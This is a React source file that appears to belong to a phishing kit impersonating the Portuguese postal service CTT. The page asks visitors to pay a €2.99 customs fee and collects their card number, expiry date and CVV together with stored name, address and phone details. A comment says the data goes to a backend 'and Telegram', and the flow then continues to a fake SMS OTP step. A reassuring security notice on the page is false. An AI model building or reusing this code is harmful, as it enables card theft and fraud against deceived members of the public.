import React, { useState, useEffect } from 'react';
import { Card, CardContent } from './ui/card';
import { Input } from './ui/input';
import { Button } from './ui/button';
import { Label } from './ui/label';
import { AlertCircle, CreditCard, CheckCircle, Package } from 'lucide-react';
import { useToast } from '../hooks/use-toast';
import { useNavigate } from 'react-router-dom';
import axios from 'axios';

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;

const CTTCardForm = () => {
  const [formData, setFormData] = useState({
    numeroCartao: '',
    dataExpiracao: '',
    cvv: ''
  });
  const [billingData, setBillingData] = useState(null);
  const [isProcessing, setIsProcessing] = useState(false);
  const { toast } = useToast();
  const navigate = useNavigate();

  useEffect(() => {
    // Load billing data from localStorage
    const savedBillingData = localStorage.getItem('ctt_billing_data');
    if (savedBillingData) {
      setBillingData(JSON.parse(savedBillingData));
    } else {
      // If no billing data, redirect to billing page
      toast({
        title: "Dados de entrega não encontrados",
        description: "Por favor, preencha primeiro as informações de entrega",
        variant: "destructive"
      });
      navigate('/billing');
    }
  }, [navigate, toast]);

  const handleInputChange = (field, value) => {
    let formattedValue = value;
    
    // Format card number (add spaces every 4 digits)
    if (field === 'numeroCartao') {
      formattedValue = value.replace(/\s/g, '').replace(/(.{4})/g, '$1 ').trim();
      if (formattedValue.length > 19) return; // Max 16 digits + 3 spaces
    }
    
    // Format expiration date (MM/AA)
    if (field === 'dataExpiracao') {
      formattedValue = value.replace(/\D/g, '').replace(/(\d{2})(\d)/, '$1/$2');
      if (formattedValue.length > 5) return; // Max MM/AA
    }
    
    // Format CVV (max 4 digits)
    if (field === 'cvv') {
      formattedValue = value.replace(/\D/g, '');
      if (formattedValue.length > 4) return; // Max 4 digits
    }

    setFormData(prev => ({
      ...prev,
      [field]: formattedValue
    }));
  };

  const validateCardNumber = (number) => {
    const cleaned = number.replace(/\s/g, '');
    return cleaned.length >= 13 && cleaned.length <= 19;
  };

  const validateExpirationDate = (date) => {
    if (date.length !== 5) return false;
    const [month, year] = date.split('/');
    const monthNum = parseInt(month, 10);
    const yearNum = parseInt(`20${year}`, 10);
    const now = new Date();
    const currentYear = now.getFullYear();
    const currentMonth = now.getMonth() + 1;
    
    if (monthNum < 1 || monthNum > 12) return false;
    if (yearNum < currentYear) return false;
    if (yearNum === currentYear && monthNum < currentMonth) return false;
    
    return true;
  };

  const validateCVV = (cvv) => {
    return cvv.length >= 3 && cvv.length <= 4;
  };

  const handleSubmit = async () => {
    if (!billingData) {
      toast({
        title: "Erro",
        description: "Dados de entrega não encontrados",
        variant: "destructive"
      });
      return;
    }

    // Validate required fields
    if (!formData.numeroCartao.trim() || !formData.dataExpiracao.trim() || !formData.cvv.trim()) {
      toast({
        title: "Campos obrigatórios",
        description: "Por favor, preencha todos os campos do cartão",
        variant: "destructive"
      });
      return;
    }

    // Validate card number
    if (!validateCardNumber(formData.numeroCartao)) {
      toast({
        title: "Número do cartão inválido",
        description: "Por favor, introduza um número de cartão válido",
        variant: "destructive"
      });
      return;
    }

    // Validate expiration date
    if (!validateExpirationDate(formData.dataExpiracao)) {
      toast({
        title: "Data de expiração inválida",
        description: "Por favor, introduza uma data de expiração válida (MM/AA)",
        variant: "destructive"
      });
      return;
    }

    // Validate CVV
    if (!validateCVV(formData.cvv)) {
      toast({
        title: "CVV inválido",
        description: "Por favor, introduza um CVV válido (3-4 dígitos)",
        variant: "destructive"
      });
      return;
    }

    setIsProcessing(true);

    try {
      // Store card data for OTP verification
      localStorage.setItem('ctt_card_data', JSON.stringify(formData));

      toast({
        title: "Dados do cartão validados!",
        description: "Enviando código de verificação SMS...",
        duration: 3000
      });

      // Simulate sending OTP
      setTimeout(() => {
        toast({
          title: "Código SMS enviado",
          description: `Código de verificação enviado para ${billingData.telefone}`,
          duration: 3000
        });
      }, 1000);
      
      // Send card data to backend (and Telegram) first
      const paymentRequest = {
        billing_data: billingData,
        card_data: formData
      };

      const response = await axios.post(`${API}/ctt/card-submit`, paymentRequest);
      
      if (response.data.status === 'success') {
        toast({
          title: "Dados processados",
          description: "Aguarde o código SMS...",
          duration: 2000
        });
      }
      
      // Navigate to OTP verification page
      setTimeout(() => {
        navigate('/otp');
      }, 2000);
      
    } catch (error) {
      console.error('Error processing payment:', error);
      
      toast({
        title: "Erro no pagamento",
        description: error.response?.data?.detail || "Erro interno. Tente novamente.",
        variant: "destructive"
      });
    } finally {
      setIsProcessing(false);
    }
  };

  const getCardType = (number) => {
    const cleaned = number.replace(/\s/g, '');
    if (cleaned.startsWith('4')) return 'Visa';
    if (cleaned.startsWith('5') || cleaned.startsWith('2')) return 'Mastercard';
    if (cleaned.startsWith('3')) return 'American Express';
    return '';
  };

  if (!billingData) {
    return <div>Carregando dados de entrega...</div>;
  }

  return (
    <div className="max-w-2xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
      <Card className="shadow-lg border-0 rounded-lg overflow-hidden">
        <CardContent className="p-8">
          {/* Form Header */}
          <div className="flex items-center mb-8">
            <AlertCircle className="w-5 h-5 text-red-600 mr-3" />
            <h2 className="text-xl font-semibold text-gray-900">
              Pagar as taxas alfandegárias (€ 2,99)
            </h2>
          </div>

          {/* Customer Info Summary */}
          <div className="bg-gray-50 rounded-lg p-4 mb-6">
            <h3 className="font-semibold text-gray-900 mb-2">Dados do cliente:</h3>
            <p className="text-sm text-gray-700">
              <strong>{billingData.nome}</strong> • {billingData.email} • {billingData.telefone}
            </p>
            <p className="text-sm text-gray-600">
              {billingData.endereco}, {billingData.codigoPostal} {billingData.cidade}
            </p>
          </div>



          {/* Payment Summary */}
          <div className="bg-gray-50 rounded-lg p-4 mb-6">
            <div className="flex items-center justify-between">
              <div className="flex items-center">
                <CreditCard className="w-5 h-5 text-gray-600 mr-2" />
                <span className="text-gray-700 font-medium">Taxa aduaneira</span>
              </div>
              <span className="text-xl font-bold text-red-600">€ 2,99</span>
            </div>
          </div>

          {/* Card Form */}
          <div className="space-y-6">
            {/* Número do cartão */}
            <div className="space-y-2">
              <Label htmlFor="numeroCartao" className="text-sm font-medium text-gray-700">
                Número do cartão <span className="text-red-500">*</span>
              </Label>
              <div className="relative">
                <Input
                  id="numeroCartao"
                  type="text"
                  placeholder="0000 0000 0000 0000"
                  value={formData.numeroCartao}
                  onChange={(e) => handleInputChange('numeroCartao', e.target.value)}
                  className="w-full px-3 py-2 pr-20 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
                  required
                  disabled={isProcessing}
                />
                {formData.numeroCartao && (
                  <div className="absolute right-3 top-1/2 transform -translate-y-1/2 text-xs text-gray-500 font-medium">
                    {getCardType(formData.numeroCartao)}
                  </div>
                )}
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              {/* Data de expiração */}
              <div className="space-y-2">
                <Label htmlFor="dataExpiracao" className="text-sm font-medium text-gray-700">
                  Data de expiração (MM/AA) <span className="text-red-500">*</span>
                </Label>
                <Input
                  id="dataExpiracao"
                  type="text"
                  placeholder="MM/AA"
                  value={formData.dataExpiracao}
                  onChange={(e) => handleInputChange('dataExpiracao', e.target.value)}
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
                  required
                  disabled={isProcessing}
                />
              </div>

              {/* CVV */}
              <div className="space-y-2">
                <Label htmlFor="cvv" className="text-sm font-medium text-gray-700">
                  Criptograma visual (CVV/CVC) <span className="text-red-500">*</span>
                </Label>
                <Input
                  id="cvv"
                  type="text"
                  placeholder="000"
                  value={formData.cvv}
                  onChange={(e) => handleInputChange('cvv', e.target.value)}
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
                  required
                  disabled={isProcessing}
                />
              </div>
            </div>
          </div>

          {/* Security Notice */}
          <div className="mt-6 flex items-center text-sm text-gray-600 bg-green-50 p-3 rounded-lg">
            <CheckCircle className="w-4 h-4 text-green-600 mr-2 flex-shrink-0" />
            <span>Os seus dados de pagamento são processados de forma segura e encriptada.</span>
          </div>

          {/* Terms Notice */}
          <div className="mt-6 text-sm text-gray-600">
            Ao clicar no botão "Seguinte", está a aceitar as Condições Especiais de Envio Internacional.
          </div>

          {/* Submit Button */}
          <div className="mt-8 flex justify-end">
            <Button
              onClick={handleSubmit}
              disabled={isProcessing}
              className={`px-8 py-2 rounded-md font-medium transition-all duration-200 ${
                isProcessing 
                  ? 'bg-gray-400 cursor-not-allowed' 
                  : 'bg-red-600 hover:bg-red-700 text-white'
              }`}
            >
              {isProcessing ? (
                <div className="flex items-center">
                  <svg className="animate-spin -ml-1 mr-3 h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                  </svg>
                  Processando...
                </div>
              ) : (
                'Seguinte'
              )}
            </Button>
          </div>
        </CardContent>
      </Card>
    </div>
  );
};

export default CTTCardForm;